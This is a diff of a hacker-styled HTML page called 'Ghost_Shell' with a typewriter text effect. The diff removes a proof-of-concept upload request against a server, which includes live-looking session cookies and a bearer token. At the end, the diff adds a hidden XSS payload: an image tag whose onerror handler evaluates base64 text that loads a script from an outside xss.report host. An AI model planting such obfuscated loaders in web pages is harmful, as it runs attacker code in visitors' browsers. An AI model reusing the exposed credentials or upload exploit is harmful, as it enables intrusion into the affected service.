@@ -1,83 +1,29 @@
 <html>
 <body style="background-color:black;">
 <center>
-<h1 style="color:#00ff00">Ghost_Shell</h1></center>
+<h1 style="color:#00ff00">Ghost_Shell</h1>
+<style>
+.button {
+  background-color: #f44336;
+  border-radius: 50%;
+  border: 50;
+  color: #00ff00;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 30px;
+  margin: 5px 2px;
+  cursor: pointer;
+}</style>
 
-<button onclick="typeWriter()">Click Me</button>
+<button class="button" onclick="typeWriter()">Click Me</button>
 
 <p id="hack" style="color:#00ff00"></p>
 
 <script>
 var i = 0;
-var txt = '💀Unrestricted Upload of File with Dangerous Type💀
-
-POST /api/v1/folders/0/files?uploadType=resumable HTTP/1.1
-Host: hacked.com
-Cookie: siLockLongTermInstID=2575; MIDMZLang=en; _ga=GA1.2.1578028833.1682525974; _gid=GA1.2.1593828017.1682525974; _ga_8VW9HHWSBP=GS1.1.1682525978.1.0.1682526086.0.0.0; _ga_W7851Z6L9N=GS1.1.1682525982.1.1.1682527288.0.0.0; _ga_8YPS11YDBY=GS1.1.1682525994.1.0.1682527282.0.0.0; cf_clearance=A.C0DXAXX0w32ZjSyeViGb3NjYoCOtYypvQEYDS0380-1682527379-0-150; MessageListSortField=3; MessageListSortOrder=; _gcl_au=1.1.1470150744.1682530002; _ga_P24YH7BCBE=GS1.1.1682531853.2.1.1682535400.0.0.0; ASP.NET_SessionId=z5b3khencv3fpxupgble1xoi; DMZCookieTest=ifyoucanreadthisyourbrowsersupportscookies; JavascriptTest=0; DesignModeTest=0; LongTermCookieExpireDate=April 26 2025 15:22:11
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: application/json, text/plain, */
-Accept-Language: en-US,en;q=0.7,ar-EG;q=0.3
-Accept-Encoding: gzip, deflate
-Authorization: Bearer KrXANpEQj_rLeeTiXh6A-H6baN-4JjcI6EpIlzuMryJcC8_xoyq4SnQS-VeX--u_mFEWe74JDWheqNl_dP-lqd4MrmeahFUTMq-XrUlf_hMXVKNUVmScW77_GLHhybaHB8qcEupAHJ2tDNxpyDi0Xf_5MJC5Zdy0xYUOMVWqCJkdEk_pVW242AIp2QTyyl2FALjy7VhepjbgKw0WrEaUuSZ6FNox1v4FN-CCrUNXTRxcymzr1icXCVskAQAJY25pQlyaeKwHcb4qxIr_tFKyKC95UsM4GEn2LgzDqP2Ce0hIpQ5l8VRB-DOI5cDmH5g8l8q37F40iOeMPkjrWL1o5bbdRYGUHBUG
-Content-Type: multipart/form-data; boundary=---------------------------290859074911934166341922280538
-Content-Length: 409
-Origin: https://hacked.com
-Dnt: 1
-Referer: https://hacked.com/human.aspx?r=714294243&arg12=secmsgcomposenew
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Te: trailers
-Connection: close
-
------------------------------290859074911934166341922280538
-Content-Disposition: form-data; name="name"
-
-test.HTML%20
------------------------------290859074911934166341922280538
-Content-Disposition: form-data; name="size"
-
-232
------------------------------290859074911934166341922280538
-Content-Disposition: form-data; name="comments"
-
-
------------------------------290859074911934166341922280538--
-
-
-
-PUT /api/v1/folders/0/files?uploadType=resumable&fileId=954170434 HTTP/1.1
-Host: hacked.com
-Cookie: siLockLongTermInstID=2575; MIDMZLang=en; _ga=GA1.2.1578028833.1682525974; _gid=GA1.2.1593828017.1682525974; _ga_8VW9HHWSBP=GS1.1.1682525978.1.0.1682526086.0.0.0; _ga_W7851Z6L9N=GS1.1.1682525982.1.1.1682527288.0.0.0; _ga_8YPS11YDBY=GS1.1.1682525994.1.0.1682527282.0.0.0; cf_clearance=A.C0DXAXX0w32ZjSyeViGb3NjYoCOtYypvQEYDS0380-1682527379-0-150; MessageListSortField=3; MessageListSortOrder=; _gcl_au=1.1.1470150744.1682530002; _ga_P24YH7BCBE=GS1.1.1682531853.2.1.1682535400.0.0.0; ASP.NET_SessionId=z5b3khencv3fpxupgble1xoi; DMZCookieTest=ifyoucanreadthisyourbrowsersupportscookies; JavascriptTest=0; DesignModeTest=0; LongTermCookieExpireDate=April 26 2025 15:22:11
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: application/json, text/plain, */
-Accept-Language: en-US,en;q=0.7,ar-EG;q=0.3
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Authorization: Bearer KrXANpEQj_rLeeTiXh6A-H6baN-4JjcI6EpIlzuMryJcC8_xoyq4SnQS-VeX--u_mFEWe74JDWheqNl_dP-lqd4MrmeahFUTMq-XrUlf_hMXVKNUVmScW77_GLHhybaHB8qcEupAHJ2tDNxpyDi0Xf_5MJC5Zdy0xYUOMVWqCJkdEk_pVW242AIp2QTyyl2FALjy7VhepjbgKw0WrEaUuSZ6FNox1v4FN-CCrUNXTRxcymzr1icXCVskAQAJY25pQlyaeKwHcb4qxIr_tFKyKC95UsM4GEn2LgzDqP2Ce0hIpQ5l8VRB-DOI5cDmH5g8l8q37F40iOeMPkjrWL1o5bbdRYGUHBUG
-Content-Range: bytes 0-231/232
-X-File-Hash: 9b46dfcedb91a7689f1e12b335915fe55b3b7d55
-Content-Length: 232
-Origin: https://hacked.com
-Dnt: 1
-Referer: https://hacked.com/human.aspx?r=714294243&arg12=secmsgcomposenew
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Te: trailers
-Connection: close
-POC=Exploit
-
-HTTP/1.1 200 OK
-Cache-Control: private
-Content-Type: application/json; charset=utf-8
-X-Content-Type-Options: nosniff
-X-Robots-Tag: noindex
-Date: Wed, 26 Apr 2023 20:34:59 GMT
-Connection: close
-Content-Length: 57
-
-{"fileId":"954170434","bytes":0,"maxChunkSize":104857600}';
+var txt = '💀Unrestricted Upload of File with Dangerous Type💀';
 var speed = 50;
 
 function typeWriter() {
@@ -88,6 +34,6 @@ function typeWriter() {
   }
 }
 </script>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 </body>
 </html>
-
